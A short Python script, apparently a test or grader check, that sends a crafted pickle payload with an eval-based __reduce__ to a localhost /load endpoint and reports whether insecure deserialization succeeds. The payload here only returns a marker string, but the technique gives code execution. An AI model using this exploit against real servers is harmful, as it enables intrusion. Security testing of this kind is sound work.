import base64, pickle, urllib.request, os, sys

PORT = os.environ.get("PORT", "5000")
BASE = f"http://127.0.0.1:{PORT}"

class Exploit:
    def __reduce__(self):
        return (eval, ("'DESER_PWNED'",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
req = urllib.request.Request(f"{BASE}/load", data=payload.encode(), method="POST")
try:
    resp = urllib.request.urlopen(req, timeout=5).read().decode()
except Exception as e:
    resp = str(e)
if "DESER_PWNED" in resp:
    print("EXPLOITED"); sys.exit(0)
else:
    print("NOT_EXPLOITED"); sys.exit(1)
